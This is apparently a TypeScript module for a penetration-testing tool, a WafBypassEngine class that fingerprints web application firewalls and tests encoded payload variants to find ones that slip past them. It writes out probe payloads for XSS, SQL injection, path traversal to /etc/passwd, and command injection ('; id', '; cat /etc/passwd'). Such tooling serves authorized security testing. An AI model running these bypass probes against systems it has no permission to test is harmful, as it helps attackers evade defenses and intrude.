export class WafBypassEngine {
  /**
   * Fingerprint WAFs on a target URL by sending probe payloads and
   * matching response signatures.
   */
  static async fingerprint(
    targetUrl: string,
    opts: { timeout?: number; customHeaders?: Record<string, string> } = {},
  ): Promise<WafDetection[]> {
    const timeout = opts.timeout ?? 8000;
    const detections: WafDetection[] = [];
    const evidenceMap: Record<string, string[]> = {};

    const triggerPayloads = [
      '<script>alert(1)</script>',
      "' OR 1=1--",
      '../../etc/passwd',
      '; cat /etc/passwd',
    ];

    for (const payload of triggerPayloads) {
      try {
        const sep = targetUrl.includes('?') ? '&' : '?';
        const testUrl = `${targetUrl}${sep}wafprobe=${encodeURIComponent(payload)}`;
        const res = await axios.get(testUrl, {
          timeout,
          validateStatus: () => true,
          maxRedirects: 0,
          headers: opts.customHeaders,
        });

        const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const setCookies = Array.isArray(res.headers['set-cookie'])
          ? res.headers['set-cookie']
          : res.headers['set-cookie'] ? [res.headers['set-cookie']] : [];
        const cookieStr = setCookies.join('; ');

        for (const sig of WAF_SIGNATURES) {
          const matches: string[] = [];

          for (const [header, pattern] of Object.entries(sig.headers)) {
            const val = String(res.headers[header] || '');
            if (val && pattern.test(val)) matches.push(`Header ${header}: ${val}`);
          }
          for (const pattern of sig.bodyPatterns) {
            if (pattern.test(bodyStr)) matches.push(`Body: ${pattern.source}`);
          }
          if (sig.cookiePatterns) {
            for (const cp of sig.cookiePatterns) {
              if (cp.test(cookieStr)) matches.push(`Cookie: ${cp.source}`);
            }
          }
          if (sig.statusCodes.includes(res.status) && matches.length > 0) {
            matches.push(`Status: ${res.status}`);
          }

          if (matches.length >= 2) {
            if (!evidenceMap[sig.name]) evidenceMap[sig.name] = [];
            evidenceMap[sig.name].push(...matches);
          }
        }
      } catch {}
    }

    for (const [name, evidence] of Object.entries(evidenceMap)) {
      const unique = [...new Set(evidence)];
      const sig = WAF_SIGNATURES.find(s => s.name === name);
      detections.push({
        name,
        vendor: sig?.vendor ?? 'Unknown',
        confidence: Math.min(unique.length / 4, 1.0),
        endpoint: targetUrl,
        evidence: unique,
      });
    }

    return detections;
  }

  /**
   * Run bypass techniques against a target where a WAF has been detected.
   * Returns successful bypasses.
   */
  static async testBypasses(
    targetUrl: string,
    detectedWafs: WafDetection[],
    opts: { timeout?: number; maxBypasses?: number; customHeaders?: Record<string, string> } = {},
  ): Promise<BypassResult[]> {
    const timeout = opts.timeout ?? 8000;
    const maxBypasses = opts.maxBypasses ?? 10;
    const results: BypassResult[] = [];
    const wafNames = detectedWafs.map(w => w.name);

    const basePayloads = [
      { name: 'XSS', value: '<script>alert(1)</script>', blockedStatus: [403, 406, 501] },
      { name: 'SQLi', value: "' OR 1=1--", blockedStatus: [403, 406, 501] },
      { name: 'RCE', value: '; id', blockedStatus: [403, 406, 501] },
      { name: 'Path Traversal', value: '../../../../etc/passwd', blockedStatus: [403, 406, 501] },
      { name: 'SSTI', value: '{{7*7}}', blockedStatus: [403, 406, 501] },
    ];

    // Get clean baseline
    let cleanStatus = 0;
    let cleanBodyLen = 0;
    try {
      const sep = targetUrl.includes('?') ? '&' : '?';
      const cleanRes = await axios.get(`${targetUrl}${sep}q=harmless_test`, {
        timeout, validateStatus: () => true, maxRedirects: 0,
        headers: opts.customHeaders,
      });
      cleanStatus = cleanRes.status;
      const cleanBody = typeof cleanRes.data === 'string' ? cleanRes.data : JSON.stringify(cleanRes.data);
      cleanBodyLen = cleanBody.length;
    } catch { return results; }

    // Skip redirect-only targets
    if (cleanStatus >= 300 && cleanStatus < 400) return results;

    // Prioritize techniques effective against detected WAFs
    const sortedTechniques = [...BYPASS_TECHNIQUES].sort((a, b) => {
      const aScore = a.effectiveAgainst?.some(w => wafNames.includes(w)) ? 0 : 1;
      const bScore = b.effectiveAgainst?.some(w => wafNames.includes(w)) ? 0 : 1;
      return aScore - bScore;
    });

    for (const bp of basePayloads) {
      if (results.length >= maxBypasses) break;

      // Verify the raw payload is actually blocked
      let blockedStatus = 0;
      try {
        const sep = targetUrl.includes('?') ? '&' : '?';
        const blockedRes = await axios.get(
          `${targetUrl}${sep}q=${encodeURIComponent(bp.value)}`,
          { timeout, validateStatus: () => true, maxRedirects: 0, headers: opts.customHeaders },
        );
        blockedStatus = blockedRes.status;
        if (!bp.blockedStatus.includes(blockedStatus)) continue;
      } catch { continue; }

      for (const technique of sortedTechniques) {
        if (results.length >= maxBypasses) break;
        try {
          const encoded = technique.transform(bp.value);
          const sep = targetUrl.includes('?') ? '&' : '?';
          const bypassUrl = `${targetUrl}${sep}q=${encodeURIComponent(encoded)}`;
          const bypassRes = await axios.get(bypassUrl, {
            timeout, validateStatus: () => true, maxRedirects: 0,
            headers: opts.customHeaders,
          });

          const bypassBody = typeof bypassRes.data === 'string'
            ? bypassRes.data : JSON.stringify(bypassRes.data);
          const notBlocked = !bp.blockedStatus.includes(bypassRes.status) && bypassRes.status !== 400;
          const statusMatchesClean = bypassRes.status === cleanStatus;
          const sizeMatchesClean = cleanBodyLen === 0
            ? bypassBody.length === 0
            : Math.abs(bypassBody.length - cleanBodyLen) < cleanBodyLen * 0.5;

          if (notBlocked && (statusMatchesClean || sizeMatchesClean)) {
            results.push({
              technique: technique.name,
              category: technique.category,
              payloadType: bp.name,
              originalPayload: bp.value,
              encodedPayload: encoded.substring(0, 500),
              originalStatus: blockedStatus,
              bypassStatus: bypassRes.status,
              cleanStatus,
              endpoint: targetUrl,
              wafName: wafNames.join(', ') || 'Unknown',
              confidence: statusMatchesClean && sizeMatchesClean ? 0.9 : 0.7,
            });
          }
        } catch {}
      }
    }

    return results;
  }

  /** Return the full technique library for UI display or selection. */
  static getTechniques(): Array<{ name: string; category: string; rationale: string }> {
    return BYPASS_TECHNIQUES.map(t => ({
      name: t.name,
      category: t.category,
      rationale: t.rationale,
    }));
  }

  /** Return the full WAF signature list for UI display. */
  static getSignatures(): Array<{ name: string; vendor: string }> {
    return WAF_SIGNATURES.map(s => ({ name: s.name, vendor: s.vendor }));
  }
}
